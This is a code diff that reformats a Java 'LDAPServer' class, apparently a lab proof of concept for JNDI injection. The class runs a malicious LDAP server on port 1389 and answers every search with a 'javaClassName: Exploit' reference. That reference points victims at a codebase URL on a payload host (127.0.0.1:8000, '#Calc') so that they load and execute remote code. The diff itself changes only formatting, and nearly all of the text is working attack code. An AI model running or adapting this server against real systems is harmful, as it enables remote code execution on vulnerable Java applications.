@@ -22,7 +22,7 @@ import java.text.ParseException;
 public class LDAPServer {
     private static final String LDAP_BASE = "dc=example,dc=com";
 
-    public static void main (String[] args) {
+    public static void main(String[] args) {
 
         String url = "http://127.0.0.1:8000/#Calc";
         int port = 1389;
@@ -41,9 +41,8 @@ public class LDAPServer {
             InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
             System.out.println("Listening on 0.0.0.0:" + port);
             ds.startListening();
-
         }
-        catch ( Exception e ) {
+        catch (Exception e) {
             e.printStackTrace();
         }
     }
@@ -51,33 +50,28 @@ public class LDAPServer {
     private static class OperationInterceptor extends InMemoryOperationInterceptor {
 
         private URL codebase;
-        public OperationInterceptor ( URL cb ) {
+        public OperationInterceptor(URL cb) {
             this.codebase = cb;
         }
-        /**
-         * {@inheritDoc}
-         *
-         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
-         */
+
         @Override
-        public void processSearchResult (InMemoryInterceptedSearchResult result ) {
+        public void processSearchResult(InMemoryInterceptedSearchResult result) {
             String base = result.getRequest().getBaseDN();
             Entry e = new Entry(base);
             try {
                 sendResult(result, base, e);
             }
-            catch ( Exception e1 ) {
+            catch (Exception e1) {
                 e1.printStackTrace();
             }
-
         }
 
-        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
+        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException {
 
             e.addAttribute("javaClassName", "Exploit");
             String cbstring = this.codebase.toString();
             int refPos = cbstring.indexOf('#');
-            if ( refPos > 0 ) {
+            if (refPos > 0) {
                 cbstring = cbstring.substring(0, refPos);
             }
 //             Payload1: 利用 LDAP + Reference Factory
@@ -97,6 +91,5 @@ public class LDAPServer {
             result.sendSearchEntry(e);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
         }
-
     }
 }
